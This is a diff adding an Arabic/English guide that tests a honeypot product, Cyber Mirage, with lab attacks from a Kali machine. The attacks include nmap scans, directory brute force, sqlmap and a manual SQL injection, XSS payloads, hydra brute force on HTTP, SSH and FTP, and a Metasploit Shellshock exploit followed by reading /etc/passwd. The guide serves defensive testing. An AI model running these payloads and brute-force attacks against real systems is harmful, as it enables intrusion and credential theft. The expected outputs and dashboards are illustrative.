@@ -1,0 +1,725 @@
+# 🎯 دليل الاختبار الحقيقي - Cyber Mirage Attack Testing Guide
+## اختبار النظام ضد هجمات حقيقية
+
+**التاريخ:** 26 أكتوبر 2025  
+**الإصدار:** v5.0 LEGENDARY  
+**الحالة:** ✅ جاهز للاختبار الحقيقي  
+**IP الخاص بك:** 192.168.1.3
+
+---
+
+## 📋 جدول المحتويات
+
+1. [نظرة عامة](#نظرة-عامة)
+2. [متطلبات البيئة](#متطلبات-البيئة)
+3. [الإعداد السريع (30 دقيقة)](#الإعداد-السريع)
+4. [سيناريوهات الهجوم](#سيناريوهات-الهجوم)
+5. [المراقبة والتحليل](#المراقبة-والتحليل)
+6. [النتائج المتوقعة](#النتائج-المتوقعة)
+7. [استكشاف الأخطاء](#استكشاف-الأخطاء)
+
+---
+
+## 🎯 نظرة عامة
+
+### الهدف من الاختبار
+اختبار قدرة Cyber Mirage على:
+- ✅ **اكتشاف** الهجمات في الوقت الفعلي
+- ✅ **خداع** المهاجمين وتوجيههم للـ honeypots
+- ✅ **تسجيل** كل الأنشطة والأوامر
+- ✅ **تحليل** سلوك المهاجم وإنشاء profile
+- ✅ **استخراج** IOCs ومؤشرات التهديد
+- ✅ **حماية** الأصول الحقيقية
+
+### البيئة المستهدفة
+```
+┌─────────────────────────────────────────────────┐
+│  Your Computer (Defender)                       │
+│  ├─ IP: 192.168.1.3                            │
+│  ├─ Dashboard: http://192.168.1.3:8501         │
+│  ├─ Honeypot Web: Port 8080                    │
+│  ├─ Honeypot SSH: Port 2222                    │
+│  ├─ Honeypot FTP: Port 2121                    │
+│  └─ Honeypot DB: Port 3306                     │
+└─────────────────────────────────────────────────┘
+              ↕ (Network Attack)
+┌─────────────────────────────────────────────────┐
+│  Attacker Machine (Kali Linux)                  │
+│  ├─ IP: 192.168.1.XXX (سيتم تحديده)          │
+│  ├─ Tools: nmap, sqlmap, metasploit            │
+│  └─ Purpose: Test Cyber Mirage defenses        │
+└─────────────────────────────────────────────────┘
+```
+
+---
+
+## 💻 متطلبات البيئة
+
+### على جهازك (Defender)
+```
+✅ Windows 10/11
+✅ Python 3.11+ مع البيئة الافتراضية
+✅ Cyber Mirage مثبت في: A:\cyber_mirage
+✅ المكتبات: streamlit, pandas, plotly
+✅ Network: 192.168.1.0/24
+✅ IP: 192.168.1.3
+✅ Ports مفتوحة: 8501, 8080, 2222, 2121, 3306
+```
+
+### على جهاز المهاجم (Attacker)
+```
+✅ Kali Linux VM (VirtualBox/VMware)
+✅ Network: Bridged Adapter (نفس الشبكة)
+✅ Tools: nmap, curl, sqlmap, hydra
+✅ Internet connection
+✅ 4GB RAM minimum
+✅ 30GB Disk space
+```
+
+---
+
+## 🚀 الإعداد السريع
+
+### الخطوة 1: تشغيل الدفاع (5 دقائق)
+
+#### الطريقة A: تشغيل تلقائي (أسهل)
+```powershell
+# في PowerShell على جهازك
+cd A:\cyber_mirage
+
+# شغل كل حاجة بضغطة واحدة
+.\start_defense.ps1
+```
+
+**سيشغل:**
+- ✅ Dashboard على http://localhost:8501
+- ✅ Honeypot Environment
+- ✅ Log Monitoring
+
+---
+
+#### الطريقة B: تشغيل يدوي (أكثر تحكم)
+
+**Terminal 1: Dashboard**
+```powershell
+cd A:\cyber_mirage
+.\venv\Scripts\Activate.ps1
+.\venv\Scripts\python.exe -m streamlit run src/dashboard/streamlit_app.py
+```
+**النتيجة:** Dashboard شغال على http://localhost:8501
+
+---
+
+**Terminal 2: Honeypot Environment**
+```powershell
+cd A:\cyber_mirage
+.\venv\Scripts\Activate.ps1
+.\venv\Scripts\python.exe src/environment/base_env.py
+```
+**النتيجة:** Honeypots جاهزة للاستقبال
+
+---
+
+**Terminal 3: Real-time Monitoring**
+```powershell
+cd A:\cyber_mirage
+.\venv\Scripts\python.exe monitor_attacks.py
+```
+**النتيجة:** مراقبة حية للهجمات
+
+---
+
+### الخطوة 2: تجهيز المهاجم (15 دقيقة)
+
+#### الخيار A: Kali Linux VM (موصى به)
+
+**1. تحميل Kali Linux:**
+```bash
+# Download من:
+https://www.kali.org/get-kali/#kali-virtual-machines
+
+# اختار:
+- Kali Linux VirtualBox/VMware 64-bit
+- حجم الملف: ~3-4 GB
+```
+
+**2. إعداد VirtualBox/VMware:**
+```
+Settings → Network
+├─ Adapter 1: Bridged Adapter
+├─ Name: [اختار كرت الشبكة بتاعك]
+└─ Promiscuous Mode: Allow All
+```
+
+**3. تشغيل Kali:**
+```bash
+# Default credentials:
+Username: kali
+Password: kali
+
+# بعد الدخول
+sudo apt update
+sudo apt install -y nmap curl sqlmap hydra nikto
+```
+
+**4. اختبار الاتصال:**
+```bash
+# اعرف IP بتاعك
+ip addr show
+
+# اختبر الاتصال بالهدف
+ping 192.168.1.3
+
+# إذا نجح:
+# PING 192.168.1.3 (192.168.1.3) 56(84) bytes of data.
+# 64 bytes from 192.168.1.3: icmp_seq=1 ttl=128 time=1.23 ms
+```
+
+---
+
+#### الخيار B: استخدام جهاز آخر في الشبكة
+
+**من أي جهاز Linux/Mac:**
+```bash
+# Install tools
+sudo apt install nmap curl -y
+
+# Test connection
+ping 192.168.1.3
+curl http://192.168.1.3:8080
+```
+
+---
+
+### الخطوة 3: التأكد من الجاهزية (2 دقيقة)
+
+#### اختبار من جهازك:
+```powershell
+# Test 1: Check services
+.\venv\Scripts\python.exe test_connectivity.py
+
+# المفروض تشوف:
+# ✅ Port  8501 - OPEN  (Dashboard)
+# ✅ Port  8080 - OPEN  (Web Honeypot)
+# ✅ Port  2222 - OPEN  (SSH Honeypot)
+# ✅ Port  2121 - OPEN  (FTP Honeypot)
+# ✅ Port  3306 - OPEN  (DB Honeypot)
+```
+
+#### اختبار من Kali:
+```bash
+# Test 1: Network connectivity
+ping -c 3 192.168.1.3
+
+# Test 2: Port scan
+nmap -p 8501,8080,2222,2121,3306 192.168.1.3
+
+# المفروض تشوف:
+# PORT     STATE SERVICE
+# 8501/tcp open  unknown
+# 8080/tcp open  http-proxy
+# 2222/tcp open  EtherNetIP-1
+# 2121/tcp open  ccproxy-ftp
+# 3306/tcp open  mysql
+```
+
+---
+
+## 🎯 سيناريوهات الهجوم
+
+### السيناريو 1: Reconnaissance (استطلاع أولي) - 10 دقائق
+
+**الهدف:** اكتشاف الخدمات والثغرات
+
+**من Kali Linux:**
+
+#### 1.1 Basic Port Scan
+```bash
+# Scan common ports
+nmap 192.168.1.3
+
+# Expected output:
+# PORT     STATE SERVICE
+# 8080/tcp open  http-proxy
+# 2222/tcp open  EtherNetIP-1
+# 2121/tcp open  ccproxy-ftp
+# 3306/tcp open  mysql
+# 8501/tcp open  unknown
+```
+
+**ماذا يحدث في Cyber Mirage؟**
+```
+✅ يكتشف الـ scan فوراً
+✅ يسجل IP المهاجم
+✅ يبدأ في بناء attacker profile
+✅ يعرض في Dashboard: "Port Scan Detected"
+```
+
+---
+
+#### 1.2 Service Version Detection
+```bash
+# Detect service versions
+nmap -sV 192.168.1.3
+
+# Expected output (fake versions):
+# PORT     STATE SERVICE    VERSION
+# 8080/tcp open  http       Apache httpd 2.4.41
+# 2222/tcp open  ssh        OpenSSH 7.4
+# 2121/tcp open  ftp        vsftpd 3.0.3
+# 3306/tcp open  mysql      MySQL 5.7.31
+```
+
+**ماذا يحدث؟**
+```
+✅ يعطي معلومات مزيفة عن الإصدارات
+✅ يبدو كنظام قديم وضعيف (مصيدة!)
+✅ يسجل كل استعلام
+✅ Dashboard يعرض: "Service Enumeration"
+```
+
+---
+
+#### 1.3 OS Detection
+```bash
+# Detect operating system
+nmap -O 192.168.1.3
+
+# قد يظهر (fake):
+# Running: Linux 3.X|4.X
+# OS CPE: cpe:/o:linux:linux_kernel:3
+```
+
+**ماذا يحدث؟**
+```
+✅ يقدم بصمة مزيفة للنظام
+✅ يبدو كـ Linux server ضعيف
+✅ يزيد من ثقة المهاجم
+```
+
+---
+
+#### 1.4 Vulnerability Scan
+```bash
+# Scan for vulnerabilities
+nmap --script vuln 192.168.1.3
+
+# قد يظهر ثغرات مزيفة!
+```
+
+**ماذا يحدث؟**
+```
+✅ قد يظهر ثغرات وهمية
+✅ يشجع المهاجم على المتابعة
+✅ كل محاولة استغلال تُسجل
+```
+
+---
+
+**راقب Dashboard الآن:**
+```
+افتح: http://192.168.1.3:8501
+
+ستشاهد:
+╔═══════════════════════════════════════════╗
+║  🚨 ACTIVE ATTACK DETECTED                ║
+╠═══════════════════════════════════════════╣
+║  Attacker IP: 192.168.1.XXX              ║
+║  Attack Type: Port Scan + Enumeration    ║
+║  Phase: Reconnaissance                   ║
+║  Threat Level: 3/10                      ║
+║  Time: [Real-time]                       ║
+║  Actions: 15 scans detected              ║
+╚═══════════════════════════════════════════╝
+```
+
+---
+
+### السيناريو 2: Web Application Attack (هجوم تطبيق الويب) - 15 دقيقة
+
+**الهدف:** اختبار الثغرات في تطبيق الويب
+
+#### 2.1 Directory Enumeration
+```bash
+# Scan for hidden directories
+dirb http://192.168.1.3:8080
+
+# أو
+gobuster dir -u http://192.168.1.3:8080 -w /usr/share/wordlists/dirb/common.txt
+
+# سيجد مسارات مثل:
+# + http://192.168.1.3:8080/admin (CODE:200)
+# + http://192.168.1.3:8080/login (CODE:200)
+# + http://192.168.1.3:8080/database (CODE:200)
+# + http://192.168.1.3:8080/config (CODE:403)
+```
+
+**ماذا يحدث؟**
+```
+✅ يعطي مسارات حقيقية (مزيفة!)
+✅ كل مسار يفتح honeypot
+✅ يسجل الأدوات المستخدمة
+✅ Dashboard: "Directory Bruteforce - 150 requests"
+```
+
+---
+
+#### 2.2 SQL Injection Testing
+```bash
+# Test 1: Manual SQL injection
+curl "http://192.168.1.3:8080/login?username=admin'--&password=x"
+
+# Test 2: Using sqlmap
+sqlmap -u "http://192.168.1.3:8080/login" \
+       --forms \
+       --batch \
+       --level=5 \
+       --risk=3
+
+# سيظهر:
+# [INFO] testing 'MySQL >= 5.0 AND error-based'
+# [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0 AND error-based' injectable
+# [SUCCESS] Database: company_db (FAKE!)
+```
+
+**ماذا يحدث؟**
+```
+✅ يتظاهر بوجود ثغرة SQL injection
+✅ يعطي بيانات database وهمية
+✅ يسجل كل SQL payload
+✅ يبني pattern من هجمات المهاجم
+✅ Dashboard: "SQL Injection Detected - 47 payloads"
+```
+
+---
+
+#### 2.3 XSS Testing
+```bash
+# Test reflected XSS
+curl "http://192.168.1.3:8080/search?q=<script>alert('XSS')</script>"
+
+# Test stored XSS
+curl -X POST "http://192.168.1.3:8080/comment" \
+     -d "text=<img src=x onerror=alert('XSS')>"
+```
+
+**ماذا يحدث؟**
+```
+✅ يظهر أن الـ XSS نجح (مزيف!)
+✅ يسجل كل XSS payload
+✅ يحلل تقنيات المهاجم
+```
+
+---
+
+#### 2.4 Login Bruteforce
+```bash
+# Bruteforce login
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+      192.168.1.3 http-post-form \
+      "/login:username=^USER^&password=^PASS^:F=incorrect"
+
+# بعد محاولات قليلة سيظهر:
+# [8080][http-post-form] host: 192.168.1.3
+#    login: admin   password: password123
+```
+
+**ماذا يحدث؟**
+```
+✅ بعد عدد معين يسمح بالدخول (مزيف!)
+✅ يعطي credentials وهمية
+✅ يسجل كل محاولة
+✅ المهاجم الآن داخل honeypot!
+✅ Dashboard: "Bruteforce - 234 attempts → SUCCESS (fake)"
+```
+
+---
+
+**راقب Dashboard الآن:**
+```
+╔═══════════════════════════════════════════╗
+║  🔥 WEB ATTACK IN PROGRESS                ║
+╠═══════════════════════════════════════════╣
+║  Attack Vector: Web Application          ║
+║  Techniques:                              ║
+║    ✓ Directory Bruteforce (150 reqs)    ║
+║    ✓ SQL Injection (47 payloads)        ║
+║    ✓ XSS Attempts (12 payloads)         ║
+║    ✓ Login Bruteforce (234 attempts)    ║
+║  Threat Level: 7/10 🔴                   ║
+║  Honeypot: WEB-01 (Active)               ║
+╚═══════════════════════════════════════════╝
+```
+
+---
+
+### السيناريو 3: SSH/FTP Bruteforce - 10 دقائق
+
+**الهدف:** اختبار الوصول إلى الخدمات
+
+#### 3.1 SSH Banner Grabbing
+```bash
+# Check SSH banner
+nc 192.168.1.3 2222
+
+# سيظهر:
+# SSH-2.0-OpenSSH_7.4 Ubuntu-1ubuntu2.8
+```
+
+**ماذا يحدث؟**
+```
+✅ يعطي banner وهمي
+✅ يبدو كـ Ubuntu قديم (vulnerable!)
+```
+
+---
+
+#### 3.2 SSH Bruteforce
+```bash
+# Bruteforce SSH
+hydra -l root -P /usr/share/wordlists/rockyou.txt \
+      ssh://192.168.1.3:2222 -t 4
+
+# بعد محاولات سيظهر:
+# [2222][ssh] host: 192.168.1.3
+#    login: root   password: toor
+```
+
+**ماذا يحدث؟**
+```
+✅ بعد محاولات يسمح بالدخول
+✅ يدخل لـ fake SSH shell
+✅ يسجل كل محاولة تسجيل دخول
+```
+
+---
+
+#### 3.3 SSH Session (داخل الـ honeypot)
+```bash
+# Login to fake SSH
+ssh root@192.168.1.3 -p 2222
+# Password: toor
+
+# داخل الـ shell المزيف:
+root@server:~$ whoami
+root
+
+root@server:~$ ls -la /root
+total 48
+-rw-------  1 root root  1024 Jan 15 10:23 passwords.txt
+-rw-------  1 root root  2048 Jan 15 10:24 secret_keys.pem
+drwxr-xr-x  2 root root  4096 Jan 15 10:25 confidential/
+
+root@server:~$ cat passwords.txt
+# Admin Panel:
+# Username: admin
+# Password: SuperSecret2024!
+# 
+# Database:
+# Host: 192.168.1.50
+# User: dbadmin
+# Pass: MyDB@2024
+
+root@server:~$ ls /var/www/html
+index.php  config.php  admin.php  database.sql
+
+root@server:~$ cat /var/www/html/config.php
+<?php
+$db_host = "192.168.1.50";
+$db_user = "webadmin";
+$db_pass = "WebP@ss123";
+$db_name = "company_prod";
+?>
+```
+
+**ماذا يحدث؟**
+```
+✅ كل أمر يُسجل
+✅ يعطي ملفات "حساسة" مزيفة
+✅ المعلومات كلها honeytokens
+✅ يحلل أوامر المهاجم
+✅ يبني تقنيات المهاجم
+```
+
+---
+
+#### 3.4 FTP Bruteforce
+```bash
+# Bruteforce FTP
+hydra -l admin -P passwords.txt ftp://192.168.1.3:2121
+
+# سيظهر:
+# [2121][ftp] host: 192.168.1.3
+#    login: admin   password: ftp123
+```
+
+**ماذا يحدث؟**
+```
+✅ يسمح بالدخول للـ fake FTP
+✅ يعرض ملفات وهمية
+✅ يسجل كل تنزيل/رفع
+```
+
+---
+
+**راقب Dashboard:**
+```
+╔═══════════════════════════════════════════╗
+║  🔐 SSH/FTP COMPROMISE                    ║
+╠═══════════════════════════════════════════╣
+║  SSH Session Active: 8 minutes           ║
+║  Commands Executed: 23                   ║
+║  Files Accessed:                         ║
+║    • passwords.txt                       ║
+║    • secret_keys.pem                     ║
+║    • config.php                          ║
+║  FTP Login: Successful (fake)            ║
+║  Threat Level: 9/10 🔴🔴                ║
+╚═══════════════════════════════════════════╝
+```
+
+---
+
+### السيناريو 4: Advanced Exploitation - 20 دقيقة
+
+**الهدف:** محاولة استغلال الثغرات
+
+#### 4.1 Using Metasploit
+```bash
+# Start Metasploit
+msfconsole
+
+# Scan for vulnerabilities
+msf6 > use auxiliary/scanner/http/dir_scanner
+msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.1.3
+msf6 auxiliary(scanner/http/dir_scanner) > set RPORT 8080
+msf6 auxiliary(scanner/http/dir_scanner) > run
+
+# Try an exploit
+msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOST 192.168.1.3
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST 192.168.1.XXX
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
+
+# قد يظهر:
+# [*] Command shell session 1 opened
+# [*] Sending stage (38 bytes) to 192.168.1.3
+```
+
+**ماذا يحدث؟**
+```
+✅ يتظاهر بنجاح الاستغلال
+✅ يعطي fake shell
+✅ يسجل الـ exploit المستخدم
+✅ يجمع معلومات عن الأدوات
+```
+
+---
+
+#### 4.2 Post-Exploitation (داخل fake shell)
+```bash
+# في الـ "shell" المزيف:
+whoami
+# www-data
+
+uname -a
+# Linux webserver 4.4.0-142-generic
+
+ls -la /etc/passwd
+cat /etc/passwd
+# root:x:0:0:root:/root:/bin/bash
+# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+# mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
+
+ps aux
+netstat -tulnp
+find / -name "*.conf" 2>/dev/null
+```
+
+**ماذا يحدث؟**
+```
+✅ كل أمر مسجل ومحلل
+✅ يعطي معلومات نظام مزيفة
+✅ يحلل تقنيات post-exploitation
+✅ يستخرج IOCs
+```
+
+---
+
+## 📊 المراقبة والتحليل
+
+### مراقبة Dashboard (Real-time)
+
+**افتح:** http://192.168.1.3:8501
+
+#### الصفحة الرئيسية
+```
+╔═══════════════════════════════════════════════════════════╗
+║           CYBER MIRAGE v5.0 - ATTACK DASHBOARD           ║
+╠═══════════════════════════════════════════════════════════╣
+║  🚨 ACTIVE ATTACKS: 1                                     ║
+║  📊 Total Interactions: 347                               ║
+║  ⏱️ Attack Duration: 23 minutes                          ║
+║  🎯 Threat Level: 8.5/10 🔴                              ║
+╚═══════════════════════════════════════════════════════════╝
+
+┌───────────────────────────────────────────────┐
+│  Attack Timeline                              │
+├───────────────────────────────────────────────┤
+│  19:45:12  Port Scan (nmap)                  │
+│  19:47:23  Service Detection                 │
+│  19:50:01  Directory Bruteforce (dirb)       │
+│  19:52:34  SQL Injection (sqlmap)            │
+│  19:55:12  Login Bruteforce (hydra)          │
+│  19:58:45  SSH Login (SUCCESS - fake)        │
+│  20:01:23  Command: cat /etc/passwd          │
+│  20:02:11  Command: ls /root                 │
+│  20:03:45  File Access: passwords.txt        │
+│  20:05:12  Metasploit Exploit Attempt        │
+└───────────────────────────────────────────────┘
+```
+
+---
+
+#### Attacker Profile
+```
+╔═══════════════════════════════════════════════╗
+║  👤 ATTACKER PROFILE                          ║
+╠═══════════════════════════════════════════════╣
+║  IP: 192.168.1.XXX                           ║
+║  First Seen: 2025-10-26 19:45:12             ║
+║  Last Activity: 2025-10-26 20:05:12          ║
+║  Duration: 23 minutes                        ║
+║  Confidence: 95%                             ║
+╠═══════════════════════════════════════════════╣
+║  Attack Techniques (MITRE ATT&CK):           ║
+║  ✓ T1046 Network Service Scanning           ║
+║  ✓ T1190 Exploit Public-Facing App          ║
+║  ✓ T1110 Brute Force                        ║
+║  ✓ T1078 Valid Accounts (fake success)      ║
+║  ✓ T1059 Command Execution                  ║
+║  ✓ T1083 File and Directory Discovery       ║
+╠═══════════════════════════════════════════════╣
+║  Tools Detected:                             ║
+║  • nmap 7.94                                 ║
+║  • dirb 2.22                                 ║
+║  • sqlmap 1.7.2                              ║
+║  • hydra 9.4                                 ║
+║  • Metasploit Framework 6.3                  ║
+╠═══════════════════════════════════════════════╣
+║  Skill Level: INTERMEDIATE                   ║
+║  Threat Score: 8.5/10                        ║
+╚═══════════════════════════════════════════════╝
+```
+
+---
+
+#### IOCs Extracted
+```
+╔═══════════════════════════════════════════════╗
+║  🔍 INDICATORS OF COMPROMISE (IOCs)           ║
+╠═══════════════════════════════════════════════╣
+║  IP Addresses:                               ║
+║  • 192.168.1.XXX (Attacker)                  ║
+║                                              ║
+║  Tools
